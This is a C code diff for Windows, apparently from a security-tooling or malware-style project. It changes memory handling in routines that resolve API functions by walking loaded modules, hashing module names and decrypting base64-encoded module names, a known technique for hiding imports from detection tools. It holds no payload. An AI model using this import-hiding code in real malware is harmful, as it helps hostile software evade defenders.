@@ -2,11 +2,12 @@
 #include <winternl.h>
 #include "Importer.h"
 #include "../crypto/Crypto.h"
+#include "../memoryCollector/MemoryCollector.h"
 
 LPWSTR lowerWideString (LPCWSTR Str1) {
 
 	int		len1	= lstrlenW(Str1);
-    LPWSTR lStr1 = (LPWSTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (len1 + 1) * sizeof(WCHAR));
+    LPWSTR lStr1 = (LPWSTR)allocMemory((len1 + 1) * sizeof(WCHAR));
 	int		i		= 0;
 
 	// Checking length. We dont want to overflow the buffers
@@ -38,7 +39,9 @@ HMODULE getModuleHandleCen(LPCSTR moduleName)
     while (nextNode != headNode)
     {   
         LPWSTR moduleNameLower = lowerWideString(nextModule->FullDllName.Buffer);
-        if (HASH_KERNERL32DLL_ROUTE == hashWide(moduleNameLower) && HeapFree(GetProcessHeap(), 0, (LPVOID)moduleNameLower))
+        DWORD hash = hashWide(moduleNameLower);
+        freeMemory((LPVOID)moduleNameLower);
+        if (HASH_KERNERL32DLL_ROUTE == hash)
         {
             break;
         }
@@ -88,7 +91,9 @@ HMODULE getModuleHandleCen(LPCSTR moduleName)
                 LPCSTR moduleName
             );
             GetModuleCen getHandle = (GetModuleCen)pFunction;
-            return getHandle(moduleName);
+            HMODULE handle =  getHandle(moduleName);
+            freeMemory(moduleName);
+            return handle;
         }
     }
 
@@ -98,10 +103,9 @@ HMODULE getModuleHandleCen(LPCSTR moduleName)
 FARPROC getProcAddrCen(LPCSTR moduleName, DWORD hash)
 {
     /* DECRYPT MOUDLE NAME */
-    DWORD length = frombase64GetLength(moduleName, strlen(moduleName));
-    PBYTE blobData = fromBase64GetBlob(moduleName, strlen(moduleName), length);
-    HMODULE hDll = getModuleHandleCen((LPCSTR)encrypt((unsigned char*)blobData, length));
-    HeapFree(GetProcessHeap(), 0, blobData);
+    LPCSTR moduleNameDecrypted = decrypt(moduleName, strlen(moduleName));
+    HMODULE hDll = getModuleHandleCen(moduleNameDecrypted);
+
     /* A PARTIR DE AQUÍ ES OBTENER LAS FUNCIONES IMPORTADAS POR EL MODULO */
     PBYTE pHDll = (PBYTE)hDll;
     if (hDll == INVALID_HANDLE_VALUE)
